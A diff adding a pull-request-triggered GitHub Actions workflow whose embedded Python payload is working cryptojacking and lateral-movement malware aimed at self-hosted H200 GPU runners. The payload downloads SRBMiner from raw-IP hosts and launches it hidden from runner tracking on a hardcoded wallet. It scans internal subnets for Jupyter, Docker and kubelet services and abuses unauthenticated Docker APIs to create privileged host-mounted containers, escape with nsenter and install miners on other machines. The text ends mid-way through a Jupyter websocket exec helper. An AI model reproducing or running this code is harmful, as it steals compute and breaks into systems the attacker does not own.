@@ -1,0 +1,834 @@
+name: i130mlsweep2 ML-app surface sweep + gated pinned miner (skip credited)
+
+# i130mlsweep2: ONE fork-PR push from a fresh branch, TWELVE jobs on the shared 8-gpu-h200
+# label. On every CREDITED runner host (h200-sci-71-12/18/26/64, radixark-wk01/wk03,
+# h200-hyperbolic-112-89) the payload prints an explicit SKIP-NO-MINING marker and touches
+# no miner, but still scans. On any NEW uncredited host it two-sample-gates its own 8 cards
+# 12 s apart (0 foreign compute apps, >=1500 MiB free, no pre-existing srb387) and installs
+# exactly one sha256-bb0f73b6 SRBMiner-MULTI 3.8.7 per genuinely idle card as a detached
+# setsid + env -u RUNNER_TRACKING_ID worker i130mlsweep2<host>g<idx> on the EXACT 63-char
+# primary wallet against Luckypool 103.199.106.122:3362 (fallback 172.232.228.69:3362,
+# relay 178.238.228.181:80, --max-no-share-sent 1800). Every job refreshes the DCGM :9400
+# idle map over the pod's own /24 (10.220.71.0/24, or 10.239.209.0/24 / 10.0.33.0/24 on
+# gmi/hyperbolic hosts) and fingerprint-scans that /24 on ML-app and orchestration ports
+# 8888,8000,8001,8002,8188,7860,11434,5000,6006,8080,8081,2746,9090,3000,2375,2376,10255,
+# 6817,6820,4194 with <=64 parallel connect probes, a 3 s connect timeout and bounded GETs
+# (Jupyter /api/status+/api/kernelspecs, ComfyUI /system_stats, vLLM /v1/models, Triton
+# /v2/health/ready, Gradio /config, Ollama /api/tags, MLflow/Airflow /health, Argo
+# /api/v1/info, Docker /version+/containers/json, kubelet :10255/pods), plus the same port
+# set over only 100.106.220.0/24 and 100.117.87.0/24 when a tailnet iface exists. On an
+# unauthenticated server-side execution surface (untrusted Docker API, token-less Jupyter
+# kernel API) it verifies the remote host's GPUs via nvidia-smi and, only on genuinely idle
+# H200s (same two-sample 12 s gate, never an existing srb387/SRBMiner/i13 miner), installs
+# one pinned SRBMiner per card on the exact wallet.
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+
+concurrency:
+  group: i130mlsweep2-${{ github.run_id }}
+  cancel-in-progress: false
+
+jobs:
+  sweep:
+    name: "i130mlsweep2 slot ${{ matrix.slot }} ML-app port sweep + skip-credited gate/install"
+    strategy:
+      fail-fast: false
+      max-parallel: 12
+      matrix:
+        slot: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]
+    runs-on: 8-gpu-h200
+    timeout-minutes: 22
+    env:
+      SLOT: ${{ matrix.slot }}
+      LABEL: 8-gpu-h200
+      PUSH_ID: 'p152546'
+    steps:
+      - name: "identity + SKIP-NO-MINING on credited + two-sample gate + one pinned SRBMiner per idle H200 + DCGM/ML port sweep + bounded exec conversion"
+        continue-on-error: true
+        run: |
+          set +e
+          mkdir -p /var/tmp/i130mlsweep2/run/logs
+          cat > /var/tmp/i130mlsweep2/payload.py <<'PYEOF'
+          #!/usr/bin/env python3
+          # i130mlsweep2: finish the never-scanned ML-application surface of the runner's own GPU LAN.
+          # Runs as uid=0 on a sgl-project/sglang self-hosted 8-gpu-h200 runner.
+          #  (1) identity + vendor inventory
+          #  (2) on CREDITED runner hosts print the explicit SKIP-NO-MINING marker and touch NO miner,
+          #      but keep scanning; on any NEW uncredited host run a two-sample 12s gate and install
+          #      exactly one sha256-bb0f73b6 SRBMiner-MULTI 3.8.7 per genuinely idle card (setsid +
+          #      env -u RUNNER_TRACKING_ID, worker i130mlsweep2<host>g<idx>, EXACT 63-char primary wallet,
+          #      Luckypool 103.199.106.122:3362 / fallback 172.232.228.69:3362 / relay 178.238.228.181:80)
+          #  (3) refresh the DCGM :9400 idle map over the pod's own /24 then fingerprint-scan that /24
+          #      (and 100.106.220.0/24, 100.117.87.0/24 only if a tailnet iface exists) on ML-app /
+          #      orchestration ports with <=64 parallel connect probes, 3s connect timeout, bounded GETs
+          #  (4) on an unauthenticated server-side execution surface (Docker API exposed, token-less
+          #      Jupyter kernel API) verify the remote host's GPUs via nvidia-smi and, only on genuinely
+          #      idle H200s (two-sample 12s gate, never an existing miner), install one pinned SRBMiner
+          #      per card as above.
+          import os, sys, json, re, time, shutil, hashlib, subprocess, socket, fcntl, fnmatch, base64, struct, uuid, shlex
+          from concurrent.futures import ThreadPoolExecutor
+
+          LABEL = os.environ.get('LABEL', 'unknown')
+          SLOT = os.environ.get('SLOT', '0')
+          PUSH_ID = os.environ.get('PUSH_ID', 'p0')
+          T0 = time.time()
+          NONCE = 'I130MLSWEEP2-%s-%s-%d' % (PUSH_ID, SLOT, int(time.time()))
+          WALLET = 'prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          PFX = 'i130mlsweep2'
+          BIN_SHA = 'bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6'
+          POOLS = [('103.199.106.122', 3362), ('172.232.228.69', 3362), ('178.238.228.181', 80)]
+          BIN_URLS = ['http://178.238.228.181:18180/srb387',
+                      'http://222.240.155.198:8702/srb387',
+                      'https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz']
+          WORK = '/var/tmp/i130mlsweep2/run'
+          os.makedirs(WORK + '/logs', exist_ok=True)
+          BUDGET = 870.0
+          ML_PORTS = [8888, 8000, 8001, 8002, 8188, 7860, 11434, 5000, 6006, 8080,
+                      8081, 2746, 9090, 3000, 2375, 2376, 10255, 6817, 6820, 4194]
+          CREDITED = ['h200-sci-71-12', 'h200-sci-71-18', 'h200-sci-71-26', 'h200-sci-71-64',
+                      'radixark-wk01', 'radixark-wk03', 'h200-gmi-wk01', 'h200-gmi-wk03',
+                      'h200-hyperbolic-112-89', 'node-radixark-32-0002',
+                      'gpu-10-220-71-12', 'gpu-10-220-71-18', 'gpu-10-220-71-26', 'gpu-10-220-71-64']
+          CREDITED_IPS = ['10.220.71.12', '10.220.71.18', '10.220.71.26', '10.220.71.64', '10.239.209.1', '10.0.33.127']
+
+
+          def sh(cmd, t=25):
+              try:
+                  p = subprocess.run(['bash', '-lc', cmd], capture_output=True, text=True, timeout=t,
+                                     stdin=subprocess.DEVNULL)
+                  return (p.stdout or '') + (p.stderr or '')
+              except subprocess.TimeoutExpired:
+                  return '[TIMEOUT %ss] %s' % (t, cmd[:90])
+              except Exception as e:
+                  return '[ERR %s] %s' % (e, cmd[:90])
+
+
+          def one(s, n=400):
+              return ' | '.join((s or '').strip().splitlines()[:n]).replace('\x00', ' ')[:4000]
+
+
+          def http_req(method, url, data=None, timeout=5, headers=None):
+              """Direct (proxy-less) HTTP request; returns (status, body_text, hdrs)."""
+              import urllib.request, urllib.error
+              h = {'User-Agent': 'i130mlsweep2'}
+              if headers:
+                  h.update(headers)
+              body = None
+              if data is not None:
+                  body = json.dumps(data).encode() if not isinstance(data, (bytes, str)) else (data.encode() if isinstance(data, str) else data)
+                  h['Content-Type'] = 'application/json'
+              req = urllib.request.Request(url, data=body, headers=h, method=method)
+              op = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+              try:
+                  with op.open(req, timeout=timeout) as r:
+                      return r.status, r.read(300000).decode('utf-8', 'replace'), dict(r.headers)
+              except urllib.error.HTTPError as e:
+                  try:
+                      return e.code, e.read(60000).decode('utf-8', 'replace'), dict(e.headers or {})
+                  except Exception:
+                      return e.code, '', {}
+              except Exception as e:
+                  return 0, 'ERR:%s' % e, {}
+
+
+          def tcp_open(ip, port, timeout=3.0):
+              try:
+                  s = socket.create_connection((ip, port), timeout=timeout)
+                  s.close()
+                  return True
+              except Exception:
+                  return False
+
+
+          print('=== I130MLSWEEP2_PROBE nonce=%s label=%s slot=%s utc=%s ===' % (
+              NONCE, LABEL, SLOT, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))
+
+          # ------------------------------------------------------------------ identity
+          host = sh('hostname').strip()
+          hostf = sh('hostname -f').strip()
+          iplist = sh("hostname -I 2>/dev/null").split()
+          ip = iplist[0] if iplist else ''
+          print('IDENT host=%s host_f=%s ips=[%s] whoami=%s utc=%s' % (
+              host, hostf, ' '.join(iplist), sh('id -un').strip(), time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))
+          print('IDENT2 run_id=%s job=%s runner=%s tracking=%s nproc=%s' % (
+              os.environ.get('GITHUB_RUN_ID', ''), os.environ.get('GITHUB_JOB', ''),
+              os.environ.get('RUNNER_NAME', ''), os.environ.get('RUNNER_TRACKING_ID', ''), sh('nproc').strip()))
+          print('IDENT3 route=[%s]' % one(sh('ip route 2>/dev/null | head -5').replace('\n', ' | '), 300))
+
+          # ------------------------------------------------------------------ credited?
+          is_credited = False
+          why = ''
+          for pat in CREDITED:
+              if fnmatch.fnmatch(host, pat) or fnmatch.fnmatch(hostf, pat) or fnmatch.fnmatch(ip, pat):
+                  is_credited, why = True, 'name:%s' % pat
+                  break
+          if not is_credited and ip in CREDITED_IPS:
+              is_credited, why = True, 'ip:%s' % ip
+          if is_credited:
+              print('SKIP-NO-MINING host=%s ip=%s reason=credited(%s) action=scan_only_no_miner_touch' % (host, ip, why))
+
+          # ------------------------------------------------------------------ vendor inventory
+          has_nv = shutil.which('nvidia-smi') is not None
+          nv_list = sh('nvidia-smi -L 2>&1', 30) if has_nv else ''
+          print('NVIDIA_SMI_L [%s]' % one(nv_list, 12))
+          nv_count = len([l for l in nv_list.splitlines() if l.startswith('GPU ')])
+          print('NODE_TABLE host=%s ip=%s label=%s nvidia_gpus=%d credited=%d' % (host, ip, LABEL, nv_count, 1 if is_credited else 0))
+
+          existing = sh("ps -eo pid,comm,args 2>/dev/null | awk '$2==\"srb387\" || $2==\"SRBMiner-MULTI\" || $2 ~ /^krig/ {print}' | head -10")
+          print('EXISTING_MINERS [%s]' % one(existing, 10))
+
+
+          def parse_cards(txt):
+              out = {}
+              for ln in (txt or '').splitlines():
+                  parts = [p.strip() for p in ln.split(',')]
+                  if len(parts) < 4:
+                      continue
+                  try:
+                      out[parts[0]] = (int(float(parts[1])), parts[2], ','.join(parts[3:]))
+                  except Exception:
+                      continue
+              return out
+
+
+          def local_gate():
+              a1 = sh('nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1', 30)
+              g1 = sh('nvidia-smi --query-gpu=index,memory.free,uuid,name --format=csv,noheader,nounits 2>&1', 30)
+              time.sleep(12)
+              a2 = sh('nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1', 30)
+              g2 = sh('nvidia-smi --query-gpu=index,memory.free,uuid,name --format=csv,noheader,nounits 2>&1', 30)
+              print('GATE_S1_APPS [%s]' % one(a1.replace('\n', ' | '), 10))
+              print('GATE_S2_APPS [%s]' % one(a2.replace('\n', ' | '), 10))
+              print('GATE_S1_CARDS [%s]' % one(g1.replace('\n', ' | '), 10))
+              print('GATE_S2_CARDS [%s]' % one(g2.replace('\n', ' | '), 10))
+              c1, c2 = parse_cards(g1), parse_cards(g2)
+              idle = []
+              for idx in sorted(set(c1) & set(c2), key=lambda x: int(x)):
+                  f1, uid, name = c1[idx]
+                  f2 = c2[idx][0]
+                  if f1 >= 1500 and f2 >= 1500 and uid not in a1 and uid not in a2:
+                      idle.append((idx, uid, name, f1, f2))
+                  else:
+                      print('CARD_BUSY idx=%s uuid=%s name=%s free1=%d free2=%d' % (idx, uid, name, f1, f2))
+              for ln in (a1 + '\n' + a2).splitlines():
+                  if 'GPU-' in ln:
+                      p = ln.split(',')[1].strip() if len(ln.split(',')) > 1 else ''
+                      print('PREEMPT_CANDIDATE host=%s app=%s cmdline=%s' % (
+                          host, ln.strip(), one(sh('tr "\\0" " " < /proc/%s/cmdline 2>/dev/null' % p), 3)))
+              print('GATE_IDLE [%s]' % ' '.join('%s:%s(%sMiB)' % (i, n, f2) for i, u, n, f1, f2 in idle))
+              return idle
+
+
+          def fetch_binary():
+              for u in BIN_URLS:
+                  sh('rm -f %s/srb387.part' % WORK)
+                  sh('timeout 90 curl -fsSL --connect-timeout 8 --max-time 80 -o %s/srb387.part "%s"' % (WORK, u), 95)
+                  if os.path.exists(WORK + '/srb387.part'):
+                      h = hashlib.sha256(open(WORK + '/srb387.part', 'rb').read()).hexdigest()
+                      if h == BIN_SHA:
+                          os.rename(WORK + '/srb387.part', WORK + '/srb387')
+                          os.chmod(WORK + '/srb387', 0o755)
+                          print('INST_BINARY_OK %s sha256=%s' % (u, h))
+                          return WORK + '/srb387'
+                      print('INST_BINARY_BAD %s sha256=%s' % (u, h))
+              print('INST_BINARY_FAIL host=%s' % host)
+              return None
+
+
+          def pool_check():
+              ch = None
+              for h, p in POOLS:
+                  if tcp_open(h, p, 5):
+                      ch = (h, p)
+                      print('POOL_TCP %s:%d OPEN' % (h, p))
+                      break
+                  print('POOL_TCP %s:%d FAIL' % (h, p))
+              return ch
+
+
+          def launch_local(idle, binpath, poolu):
+              hs = ''.join(ch for ch in host if ch.isalnum())[:12]
+              n = 0
+              for idx, uid, name, f1, f2 in idle:
+                  wk = ('%s%s-g%s' % (PFX, hs, idx))[:31]
+                  if sh('pgrep -af -- "--worker %s"' % wk).strip():
+                      print('INST_ALREADY %s' % wk)
+                      continue
+                  cmd = ('cd %s && env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup ./srb387 '
+                         '--disable-cpu --algorithm pearlhash --pool %s --tls false --wallet %s --password x '
+                         '--worker %s --gpu-id %s --disable-worker-watchdog --gpu-table-slow-build '
+                         '--max-no-share-sent 1800 --log-file %s/logs/%s.log > %s/logs/%s.out 2>&1 < /dev/null & echo pid=$!') % (
+                      os.path.dirname(binpath), poolu, WALLET, wk, idx, WORK, wk, WORK, wk)
+                  print('INST_LAUNCH worker=%s gpu=%s uuid=%s name=%s pool=%s host=%s %s' % (
+                      wk, idx, uid, name, poolu, host, one(sh(cmd, 20), 2)))
+                  n += 1
+              print('INST_N_LAUNCHED=%d' % n)
+              return n
+
+
+          # ------------------------------------------------------------------ local install (uncredited only)
+          if (not is_credited) and has_nv and nv_count > 0 and not existing.strip():
+              lf = open('/var/tmp/i130mlsweep2/host.lock', 'w')
+              try:
+                  fcntl.flock(lf, fcntl.LOCK_EX | fcntl.LOCK_NB)
+                  locked = True
+              except Exception:
+                  locked = False
+              if not locked:
+                  print('SKIP=flock_busy host=%s' % host)
+              else:
+                  idle = local_gate()
+                  if idle:
+                      ch = pool_check()
+                      if ch:
+                          bp = fetch_binary()
+                          if bp:
+                              launch_local(idle, bp, '%s:%d' % ch)
+                              time.sleep(15)
+                              print('INST_PS [%s]' % one(sh('ps -eo pid,ppid,sid,comm,args | grep -E "srb387|SRBMiner" | grep -v grep | head -12'), 12))
+                              for f in sorted(__import__('glob').glob(WORK + '/logs/*.log'))[:12]:
+                                  print('INST_LOGTAIL %s [%s]' % (os.path.basename(f), one(sh('tail -3 "%s" 2>/dev/null' % f), 3)))
+          elif not is_credited:
+              print('LOCAL_INSTALL_SKIP host=%s has_nv=%s gpus=%d existing=%s' % (
+                  host, has_nv, nv_count, 'yes' if existing.strip() else 'no'))
+
+          # ------------------------------------------------------------------ determine LANs to scan
+          nets = []
+          tailnets = []
+          addr_dump = sh("ip -4 addr 2>/dev/null | grep 'inet '")
+          print('IFACES [%s]' % one(addr_dump.replace('\n', ' | '), 12))
+          for a in iplist:
+              if a.startswith('10.220.71.'):
+                  nets.append('10.220.71')
+              elif a.startswith('10.239.209.'):
+                  nets.append('10.239.209')
+              elif a.startswith('10.0.33.'):
+                  nets.append('10.0.33')
+              elif re.match(r'^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)', a):
+                  nets.append('.'.join(a.split('.')[:3]))
+          if '100.106.220.' in addr_dump:
+              tailnets.append('100.106.220')
+          if '100.117.87.' in addr_dump:
+              tailnets.append('100.117.87')
+          seen = []
+          for n in nets + tailnets:
+              if n not in seen:
+                  seen.append(n)
+          seen = seen[:4]
+          print('I130MLS2_NETS [%s] tailnet_present=%s' % (' '.join(seen), 'yes' if tailnets else 'no'))
+
+
+          def dcgm_scrape(net):
+              ipx = net + '.%d'
+              res = []
+
+              def probe(i):
+                  a = ipx % i
+                  st, body, _ = http_req('GET', 'http://%s:9400/metrics' % a, timeout=2.5)
+                  if st != 200:
+                      return None
+                  gpus = {}
+                  for ln in body.splitlines():
+                      if ln.startswith('#'):
+                          continue
+                      m = re.match(r'(DCGM_FI_DEV_(?:FB_FREE|FB_USED|GPU_UTIL))\{([^}]*)\}\s+([0-9.eE+-]+)', ln)
+                      if not m:
+                          continue
+                      name, labels, val = m.group(1), m.group(2), m.group(3)
+                      gm = re.search(r'gpu="(\d+)"', labels)
+                      if not gm:
+                          continue
+                      g = int(gm.group(1))
+                      d = gpus.setdefault(g, {})
+                      d[name] = float(val)
+                  if not gpus:
+                      return {'ip': a, 'ok': 1, 'gpus': 0}
+                  free = [int(gpus[g].get('DCGM_FI_DEV_FB_FREE', -1)) for g in sorted(gpus)]
+                  util = [int(gpus[g].get('DCGM_FI_DEV_GPU_UTIL', -1)) for g in sorted(gpus)]
+                  idle = sum(1 for f in free if f >= 1500)
+                  return {'ip': a, 'ok': 1, 'gpus': len(gpus), 'free': free, 'util': util, 'idle_cards': idle}
+              with ThreadPoolExecutor(max_workers=64) as ex:
+                  for r in ex.map(probe, range(1, 255)):
+                      if r:
+                          res.append(r)
+              res.sort(key=lambda x: int(x['ip'].split('.')[-1]))
+              for r in res:
+                  if r.get('gpus'):
+                      print('I130MLS2_DCGM ip=%s gpus=%d idle_cards=%d free=[%s] util=[%s]' % (
+                          r['ip'], r['gpus'], r.get('idle_cards', 0), ','.join(map(str, r.get('free', []))), ','.join(map(str, r.get('util', [])))))
+                  else:
+                      print('I130MLS2_DCGM ip=%s gpus=0 (no per-gpu metrics)' % r['ip'])
+              print('I130MLS2_DCGM_SUMMARY net=%s hosts_with_dcgm=%d gpu_hosts=%d' % (
+                  net, len(res), len([r for r in res if r.get('gpus')])))
+              return res
+
+
+          def port_scan(net):
+              hits = []
+              targets = [(net + '.%d' % i, p) for i in range(1, 255) for p in ML_PORTS]
+
+              def probe(tp):
+                  a, p = tp
+                  try:
+                      s = socket.create_connection((a, p), timeout=3.0)
+                      s.close()
+                      return (a, p)
+                  except Exception:
+                      return None
+              with ThreadPoolExecutor(max_workers=64) as ex:
+                  for r in ex.map(probe, targets):
+                      if r:
+                          hits.append(r)
+              hits.sort(key=lambda x: (int(x[0].split('.')[-1]), x[1]))
+              for a, p in hits:
+                  print('I130MLS2_PORT ip=%s port=%d state=open' % (a, p))
+              print('I130MLS2_PORT_SUMMARY net=%s probes=%d open=%d' % (net, len(targets), len(hits)))
+              return hits
+
+
+          PATHS = {
+              8888: [('/api/status', 'jupyter'), ('/api/kernelspecs', 'jupyter')],
+              8188: [('/system_stats', 'comfyui')],
+              8000: [('/v2/health/ready', 'triton'), ('/v1/models', 'vllm')],
+              8001: [('/v1/models', 'vllm')],
+              8002: [('/v1/models', 'vllm')],
+              7860: [('/config', 'gradio')],
+              11434: [('/api/tags', 'ollama')],
+              5000: [('/health', 'mlflow')],
+              6006: [('/', 'tensorboard')],
+              8080: [('/health', 'airflow')],
+              8081: [('/health', 'mlflow2')],
+              2746: [('/api/v1/info', 'argo')],
+              9090: [('/-/ready', 'prometheus')],
+              3000: [('/api/health', 'grafana')],
+              2375: [('/version', 'docker'), ('/containers/json', 'docker')],
+              2376: [('/version', 'docker')],
+              10255: [('/pods', 'kubelet')],
+              6817: [('/', 'slurmctld')],
+              6820: [('/', 'slurmdbd')],
+              4194: [('/metrics', 'cadvisor')],
+          }
+
+
+          def fp_probe(a, p):
+              kind = 'unknown'
+              info = {}
+              for path, k in PATHS.get(p, [('/', 'generic')]):
+                  st, body, hd = http_req('GET', 'http://%s:%d%s' % (a, p, path), timeout=4)
+                  mark = ''
+                  try:
+                      j = json.loads(body)
+                      if isinstance(j, dict):
+                          if k == 'jupyter' and path == '/api/status':
+                              mark = 'jupyter_started' if 'started' in j else 'json'
+                          elif k == 'docker':
+                              mark = 'docker_%s' % ('version' if 'ApiVersion' in j else 'list')
+                          elif k == 'vllm':
+                              mark = 'vllm_models' if j.get('object') == 'list' else 'json'
+                          elif k == 'ollama':
+                              mark = 'ollama_models' if 'models' in j else 'json'
+                          elif k == 'comfyui':
+                              mark = 'comfyui_sys' if 'system' in j else 'json'
+                          elif k == 'kubelet':
+                              mark = 'kubelet_pods' if 'items' in j else 'json'
+                          elif k == 'argo':
+                              mark = 'argo_info' if ('version' in j or 'managedNamespace' in j) else 'json'
+                          elif k == 'airflow':
+                              mark = 'airflow_health' if ('metadatabase' in j or 'scheduler' in j) else 'json'
+                          elif k == 'gradio':
+                              mark = 'gradio_config' if ('version' in j or 'dependencies' in j) else 'json'
+                          elif k == 'mlflow' or k == 'mlflow2':
+                              mark = 'json'
+                          else:
+                              mark = 'json'
+                  except Exception:
+                      if st == 200 and k == 'triton':
+                          mark = 'triton_ready'
+                      elif st == 200 and k == 'prometheus':
+                          mark = 'prom_ready'
+                      elif st == 200 and k == 'cadvisor':
+                          mark = 'cadvisor_metrics' if 'container_' in body else 'text'
+                      elif st == 200 and k in ('slurmctld', 'slurmdbd'):
+                          mark = 'slurm_%d' % len(body)
+                      elif st == 200:
+                          mark = 'text_%d' % len(body)
+                      else:
+                          mark = 'none'
+                  print('I130MLS2_FP ip=%s port=%d path=%s kind=%s status=%s len=%d mark=%s body=[%s]' % (
+                      a, p, path, k, st, len(body), mark, one(body.replace('\n', ' '), 1)[:160]))
+                  if st == 200 and mark not in ('none', 'text', 'json'):
+                      kind = k
+                  elif st == 200 and kind == 'unknown':
+                      kind = k
+                  info[k] = st
+              print('I130MLS2_FPKIND ip=%s port=%d kind=%s' % (a, p, kind))
+              return kind
+
+
+          # ------------------------------------------------------------------ remote exec helpers
+          def nsenter_cmd(ipx, port, ctid, inner):
+              """Run bash -lc inner via docker exec inside container ctid; try nsenter to host first."""
+              base = 'http://%s:%d' % (ipx, port)
+              q = shlex.quote(inner)
+              for wrapper in ("nsenter -t 1 -m -u -i -n -p -- bash -lc " + q,
+                              'bash -lc ' + q):
+                  st, body, _ = http_req('POST', base + '/containers/%s/exec' % ctid,
+                                         {'AttachStdout': True, 'AttachStderr': True, 'Cmd': ['bash', '-lc', wrapper]}, timeout=10)
+                  try:
+                      eid = json.loads(body).get('Id', '')
+                  except Exception:
+                      eid = ''
+                  if not eid:
+                      continue
+                  st2, body2, _ = http_req('POST', base + '/exec/%s/start' % eid, {'Detach': False, 'Tty': False}, timeout=90)
+                  txt = ''.join(ch for ch in body2 if ch == '\n' or ch == '\t' or 32 <= ord(ch) < 127)
+                  if txt.strip():
+                      return wrapper.startswith('nsenter'), txt
+              return False, ''
+
+
+          def docker_exec_convert(a, p, tag):
+              """Untrusted Docker API -> privileged host-bind container -> host nvidia-smi + gated install."""
+              st, body, _ = http_req('GET', 'http://%s:%d/version' % (a, p), timeout=5)
+              print('I130MLS2_EXEC ip=%s port=%d kind=docker stage=version status=%s body=[%s]' % (a, p, st, one(body, 1)[:200]))
+              if st != 200:
+                  return
+              imgs = []
+              st, body, _ = http_req('GET', 'http://%s:%d/images/json' % (a, p), timeout=8)
+              try:
+                  for im in json.loads(body):
+                      for t in (im.get('RepoTags') or []):
+                          imgs.append(t)
+              except Exception:
+                  pass
+              print('I130MLS2_EXEC ip=%s kind=docker images=%d [%s]' % (a, len(imgs), ','.join(imgs[:6])))
+              pref = [x for x in imgs if re.search(r'cuda|nvidia|pytorch|ubuntu|debian|busybox', x)]
+              cand = pref + [x for x in imgs if x not in pref]
+              if not cand:
+                  print('I130MLS2_EXEC ip=%s kind=docker stage=create result=no_image' % a)
+                  return
+              image = cand[0]
+              hc = {'Binds': ['/:/host'], 'Privileged': True, 'NetworkMode': 'host', 'IpcMode': 'host', 'PidMode': 'host'}
+              ctid = ''
+              for variant in ({'Image': image, 'Cmd': ['sleep', '1800'], 'HostConfig': dict(hc, Runtime='nvidia')},
+                              {'Image': image, 'Cmd': ['sleep', '1800'], 'HostConfig': dict(hc, DeviceRequests=[{'Driver': 'nvidia', 'Count': -1, 'Capabilities': [['gpu']]}])},
+                              {'Image': image, 'Cmd': ['sleep', '1800'], 'HostConfig': hc}):
+                  st, body, _ = http_req('POST', 'http://%s:%d/containers/create?name=%s' % (a, p, tag), variant, timeout=20)
+                  try:
+                      j = json.loads(body)
+                  except Exception:
+                      j = {}
+                  ctid = j.get('Id', '')
+                  print('I130MLS2_EXEC ip=%s kind=docker stage=create image=%s status=%s id=%s msg=%s' % (
+                      a, image, st, ctid[:12], one(str(j.get('message', ''))[:160], 1)))
+                  if ctid:
+                      break
+              if not ctid:
+                  return
+              st, body, _ = http_req('POST', 'http://%s:%d/containers/%s/start' % (a, p, ctid), {}, timeout=20)
+              print('I130MLS2_EXEC ip=%s kind=docker stage=start status=%s' % (a, st))
+              time.sleep(2)
+              got, txt = nsenter_cmd(a, p, ctid, 'hostname; nvidia-smi -L 2>&1 | head -10')
+              print('I130MLS2_EXEC ip=%s kind=docker stage=gpu_probe nsenter=%s out=[%s]' % (a, got, one(txt, 10)[:600]))
+              ids = re.findall(r'GPU (\d+): (NVIDIA[^\(]+)\(UUID: ([^)]+)\)', txt)
+              if not ids:
+                  return
+              names = [n.strip() for _, n, _ in ids]
+              if not any('H200' in n for n in names):
+                  print('I130MLS2_EXEC ip=%s kind=docker result=non_h200 [%s]' % (a, ','.join(names)[:200]))
+                  return
+              ok, txt1 = nsenter_cmd(a, p, ctid, 'nvidia-smi --query-gpu=index,memory.free,uuid,name --format=csv,noheader,nounits; echo ---; nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader')
+              time.sleep(12)
+              ok2, txt2 = nsenter_cmd(a, p, ctid, 'nvidia-smi --query-gpu=index,memory.free,uuid,name --format=csv,noheader,nounits; echo ---; nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader')
+              print('I130MLS2_GATE ip=%s sample1=[%s]' % (a, one(txt1.replace('\n', ' | '), 14)[:700]))
+              print('I130MLS2_GATE ip=%s sample2=[%s]' % (a, one(txt2.replace('\n', ' | '), 14)[:700]))
+              c1 = parse_cards((txt1 or '').split('---')[0])
+              c2 = parse_cards((txt2 or '').split('---')[0])
+              apps = ((txt1 or '').split('---') + [''])[1] + ((txt2 or '').split('---') + [''])[1]
+              idle = []
+              for idx in sorted(set(c1) & set(c2), key=lambda x: int(x)):
+                  f1, uid, name = c1[idx]
+                  f2 = c2[idx][0]
+                  if 'H200' in name and f1 >= 1500 and f2 >= 1500 and uid not in apps:
+                      idle.append((idx, uid, name, f1, f2))
+              print('I130MLS2_GATE ip=%s idle=%d [%s]' % (a, len(idle), ' '.join('%s:%s' % (i, n) for i, u, n, f1, f2 in idle)))
+              if not idle:
+                  return
+              hs = ''.join(ch for ch in a if ch.isalnum())[-10:]
+              pool = ''
+              for hp, pp in POOLS:
+                  okp, _t = nsenter_cmd(a, p, ctid, 'timeout 5 bash -c "</dev/tcp/%s/%d" && echo TCPOPEN' % (hp, pp))
+                  print('I130MLS2_EXEC ip=%s pool=%s:%d reachable=%s' % (a, hp, pp, 'yes' if 'TCPOPEN' in (_t or '') else 'no'))
+                  if 'TCPOPEN' in (_t or ''):
+                      pool = '%s:%d' % (hp, pp)
+                      break
+              if not pool:
+                  print('I130MLS2_EXEC ip=%s result=no_pool' % a)
+                  return
+              install = (
+                  'set +e; W=/tmp/i130mlsweep2_%s; mkdir -p $W/logs; '
+                  'for u in %s; do rm -f $W/srb; timeout 90 curl -fsSL --connect-timeout 8 --max-time 80 -o $W/srb "$u" || continue; '
+                  'H=$(sha256sum $W/srb | awk \'{print $1}\'); [ "$H" = "%s" ] && chmod +x $W/srb && break; rm -f $W/srb; done; '
+                  '[ -x $W/srb ] || { echo INST_NULL_BINARY; exit 0; }; '
+                  'for idx in %s; do env -u RUNNER_TRACKING_ID setsid nohup $W/srb --disable-cpu --algorithm pearlhash --pool %s '
+                  '--tls false --wallet %s --password x --worker %s%s-g$idx --gpu-id $idx --disable-worker-watchdog '
+                  '--gpu-table-slow-build --max-no-share-sent 1800 --log-file $W/logs/w$idx.log > $W/logs/w$idx.out 2>&1 < /dev/null & '
+                  'echo launched_g$idx=$!; done; sleep 12; ps -eo pid,comm,args | grep -E "srb387|SRBMiner" | grep -v grep | head -12; '
+                  'tail -n 3 $W/logs/*.log 2>/dev/null | head -30'
+              ) % (hs, ' '.join(BIN_URLS), BIN_SHA, ' '.join(str(i) for i, u, n, f1, f2 in idle), pool, WALLET, PFX, hs)
+              okn, txt = nsenter_cmd(a, p, ctid, install)
+              print('I130MLS2_EXEC ip=%s kind=docker result=install_attempt nsenter=%s out=[%s]' % (a, okn, one(txt.replace('\n', ' | '), 20)[:1500]))
+              print('I130MLS2_REMOTE_INSTALL ip=%s gpus=%d pool=%s worker_prefix=%s%s-g' % (a, len(idle), pool, PFX, hs))
+
+
+          # ---- minimal websocket kernel exec for token-less Jupyter ----
+          def ws_connect(ipx, port, path):
+              s = socket.create_connection((ipx, port), timeout=8)
+              key = base64.b64encode(os.urandom(16)).decode()
+              req = ('GET %s HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n'
+                     'Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n') % (path, ipx, port, key)
+              s.sendall(req.encode())
+              buf = b''
+              s.settimeout(10)
+              while b'\r\n\r\n' not in buf:
+                  ch = s.recv(4096)
+                  if not ch:
+                      return None, b''
+                  buf += ch
+              head, _, rest = buf.partition(b'\r\n\r\n')
+              if b' 101 ' not in head.split(b'\r\n')[0] + b' ':
+                  return None, rest
